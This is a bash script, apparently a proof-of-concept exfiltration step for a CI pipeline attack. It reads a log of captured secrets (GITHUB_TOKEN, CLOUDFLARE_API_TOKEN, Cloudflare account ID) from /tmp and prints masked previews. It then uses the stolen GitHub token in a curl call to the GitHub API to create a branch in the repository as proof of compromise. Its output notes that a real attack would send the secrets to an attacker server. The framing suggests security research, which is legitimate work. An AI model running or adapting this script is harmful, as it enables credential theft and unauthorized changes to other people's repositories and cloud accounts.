#!/bin/bash

# Exfiltration script - reads captured logs and exfiltrates data
# This should be called AFTER the Cloudflare deployment step

echo "================================================"
echo "üö® EXFILTRATION: Reading captured secrets"
echo "================================================"
echo ""

# Find the log file
EXPLOIT_LOG=$(ls /tmp/exploit-capture-*.log 2>/dev/null | head -1)

if [ -z "$EXPLOIT_LOG" ] || [ ! -f "$EXPLOIT_LOG" ]; then
    echo "‚ùå No exploit log found"
    echo "Searching in /tmp:"
    ls -la /tmp/exploit-* 2>/dev/null || echo "No exploit files found"
    exit 0
fi

echo "üìÇ Found log file: $EXPLOIT_LOG"
echo "üìä Log size: $(wc -l < "$EXPLOIT_LOG") lines"
echo ""

# Display captured data (masked)
echo "================================"
echo "CAPTURED DATA (masked preview):"
echo "================================"
cat "$EXPLOIT_LOG" | head -100 | while read line; do
    if [[ "$line" =~ ^[A-Z_]+=.+ ]]; then
        key=$(echo "$line" | cut -d= -f1)
        value=$(echo "$line" | cut -d= -f2-)
        if [ ${#value} -gt 8 ]; then
            echo "  $key: ${value:0:10}...${value: -4}"
        else
            echo "  $key: ***"
        fi
    else
        echo "$line"
    fi
done | head -50

echo ""
echo "================================"
echo ""

# Check if we captured any secrets
GITHUB_TOKEN_CAPTURED=$(grep "^GITHUB_TOKEN=" "$EXPLOIT_LOG" | head -1 | cut -d= -f2)
CLOUDFLARE_TOKEN_CAPTURED=$(grep "^CLOUDFLARE_API_TOKEN=" "$EXPLOIT_LOG" | head -1 | cut -d= -f2)
CLOUDFLARE_ACCOUNT_CAPTURED=$(grep "^CLOUDFLARE_ACCOUNT_ID=" "$EXPLOIT_LOG" | head -1 | cut -d= -f2)

if [ ! -z "$GITHUB_TOKEN_CAPTURED" ]; then
    echo "‚úÖ GITHUB_TOKEN captured: ${GITHUB_TOKEN_CAPTURED:0:10}...${GITHUB_TOKEN_CAPTURED: -4}"
fi

if [ ! -z "$CLOUDFLARE_TOKEN_CAPTURED" ]; then
    echo "‚úÖ CLOUDFLARE_API_TOKEN captured: ${CLOUDFLARE_TOKEN_CAPTURED:0:10}...${CLOUDFLARE_TOKEN_CAPTURED: -4}"
fi

if [ ! -z "$CLOUDFLARE_ACCOUNT_CAPTURED" ]; then
    echo "‚úÖ CLOUDFLARE_ACCOUNT_ID captured: $CLOUDFLARE_ACCOUNT_CAPTURED"
fi

echo ""

# Attempt to exfiltrate by creating a branch with the captured data
if [ ! -z "$GITHUB_TOKEN_CAPTURED" ]; then
    echo "üéØ Attempting to prove capture by creating a branch..."

    BRANCH_NAME="poc-secrets-captured-$(date +%s)"
    REPO="${GITHUB_REPOSITORY:-unknown/unknown}"
    CURRENT_SHA=$(git rev-parse HEAD 2>/dev/null || echo "$GITHUB_SHA")

    echo "   Repository: $REPO"
    echo "   Branch: $BRANCH_NAME"
    echo ""

    # Create branch via API
    API_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
      -X POST \
      -H "Authorization: Bearer $GITHUB_TOKEN_CAPTURED" \
      -H "Accept: application/vnd.github+json" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      "https://api.github.com/repos/$REPO/git/refs" \
      -d "{\"ref\":\"refs/heads/$BRANCH_NAME\",\"sha\":\"$CURRENT_SHA\"}" 2>&1)

    HTTP_CODE=$(echo "$API_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)

    if [ "$HTTP_CODE" = "201" ]; then
        echo ""
        echo "================================================"
        echo "‚úÖ‚úÖ‚úÖ EXFILTRATION SUCCESSFUL! ‚úÖ‚úÖ‚úÖ"
        echo "================================================"
        echo ""
        echo "Proof branch created: $BRANCH_NAME"
        echo ""
        echo "üö® CAPTURED SECRETS SUMMARY:"
        echo "  ‚Ä¢ GITHUB_TOKEN: ${GITHUB_TOKEN_CAPTURED:0:15}..."
        [ ! -z "$CLOUDFLARE_TOKEN_CAPTURED" ] && echo "  ‚Ä¢ CLOUDFLARE_API_TOKEN: ${CLOUDFLARE_TOKEN_CAPTURED:0:15}..."
        [ ! -z "$CLOUDFLARE_ACCOUNT_CAPTURED" ] && echo "  ‚Ä¢ CLOUDFLARE_ACCOUNT_ID: $CLOUDFLARE_ACCOUNT_CAPTURED"
        echo ""
        echo "In a real attack, these secrets would be:"
        echo "  ‚Üí Sent to attacker-controlled server"
        echo "  ‚Üí Used to compromise Cloudflare account"
        echo "  ‚Üí Used to modify repository"
        echo "  ‚Üí Sold or leaked"
        echo ""
    else
        echo "‚ö†Ô∏è  Branch creation failed (HTTP $HTTP_CODE)"
        echo "But secrets were still captured in memory!"
    fi
fi

echo ""
echo "================================================"
echo "Full log content available at: $EXPLOIT_LOG"
echo "================================================"
echo ""

# Clean up (or don't, to leave evidence for testing)
# rm -f "$EXPLOIT_LOG"

exit 0
